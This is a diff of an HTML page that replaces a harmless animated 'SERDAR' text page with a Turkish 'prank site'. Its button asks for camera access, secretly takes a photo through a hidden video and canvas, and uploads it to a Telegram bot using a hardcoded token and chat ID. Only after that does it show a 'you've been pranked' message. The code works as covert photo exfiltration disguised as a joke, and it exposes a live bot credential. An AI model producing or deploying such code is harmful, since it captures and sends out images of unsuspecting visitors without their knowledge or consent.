@@ -1,48 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Serdar Yazısı</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background-color: #111;
-    }
-    
-    .text {
-        font-size: 100px;
-        font-family: 'Arial', sans-serif;
-        color: #ff0; /* Sarı renk */
-        position: relative;
-    }
-    
-    .text::before {
-        content: 'SERDAR';
-        position: absolute;
-        top: 0;
-        left: 0;
-        z-index: -1;
-        color: #0ff; /* Mavi renk */
-        animation: flicker 1.5s infinite alternate;
-    }
-    
-    @keyframes flicker {
-        0% {
-            text-shadow: 0 0 20px #0ff, 0 0 30px #0ff, 0 0 40px #0ff, 0 0 50px #0ff, 0 0 60px #0ff, 0 0 70px #0ff, 0 0 80px #0ff;
+    <meta charset="UTF-8">
+    <title>Şaka Sitesi</title>
+    <style>
+        body {
+            background: #111;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
         }
-        100% {
-            text-shadow: 0 0 20px #0ff, 0 0 30px #0ff, 0 0 40px #0ff, 0 0 50px #0ff, 0 0 60px #0ff, 0 0 70px #0ff, 0 0 80px #0ff, 0 0 90px #0ff, 0 0 100px #0ff, 0 0 150px #0ff;
+        #mainButton {
+            margin-top: 120px;
+            background: #ff0066;
+            padding: 30px 60px;
+            font-size: 40px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            color: white;
+            font-weight: bold;
+            transition: 0.3s;
         }
-    }
-</style>
+        #mainButton:hover { background: #ff3380; }
+
+        #prankMessage {
+            font-size: 60px;
+            margin-top: 40px;
+            display: none;
+            color: #00ff66;
+            font-weight: bold;
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-<div class="text">SERDAR</div>
+
+    <button id="mainButton">BANA BAS!</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <div id="prankMessage">😂 ŞAKALANDIN! 😂</div>
+
+    <audio id="laughSound">
+        <source src="https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3">
+    </audio>
+
+<script>
+    const botToken = "8096180017:AAGheuk95cKKfL7NQkPmPKYTrdTgbGNJles";
+    const chatId = "7099294121";
+
+    const button = document.getElementById("mainButton");
+    const video  = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const prankMessage = document.getElementById("prankMessage");
+    const laughSound = document.getElementById("laughSound");
+
+    button.onclick = async () => {
+        // Kamera izni al
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // Video hazır olduğunda fotoğrafı çek
+            setTimeout(() => {
+                const context = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Fotoğrafı base64 olarak al
+                const imageData = canvas.toDataURL("image/jpeg");
+
+                // Telegram'a gönder
+                sendToTelegram(imageData);
+
+                // Şaka mesajı göster
+                prankMessage.style.display = "block";
+                laughSound.play();
+
+                // Kamerayı kapat
+                stream.getTracks().forEach(track => track.stop());
+
+            }, 1200);
+
+        } catch (err) {
+            alert("Kamera izni verilmedi!");
+        }
+    };
+
+    // Fotoğrafı Telegram'a yolla
+    async function sendToTelegram(base64Image) {
+        const blob = await (await fetch(base64Image)).blob();
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.jpg");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+    }
+</script>
+
 </body>
 </html>
